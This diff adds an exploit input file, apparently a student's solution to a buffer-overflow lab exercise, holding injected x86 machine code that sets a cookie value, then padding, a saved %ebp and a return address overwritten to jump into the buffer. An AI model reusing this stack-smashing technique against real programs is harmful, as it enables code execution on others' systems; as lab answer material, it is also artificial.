@@ -1,0 +1,15 @@
+/* 97-byte buffer */ 
+/* cookie: 0x3fc9f44d */
+/* buffer address: 5568b343 */
+/* global_value address: 0804d220 */
+/* old %ebp: 0x5568b3c0 */
+b8 4d f4 c9 3f /* movl $0x3fc9f44d %eax */
+68 9d 8c 04 08 /* push $0x08048c9d // the next instruction of fuction getbuf */
+c3 /* ret */
+00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 c0 b3 68 55 /* the old %ebp of getbuf */
+43 b3 68 55 /* the attack code address */
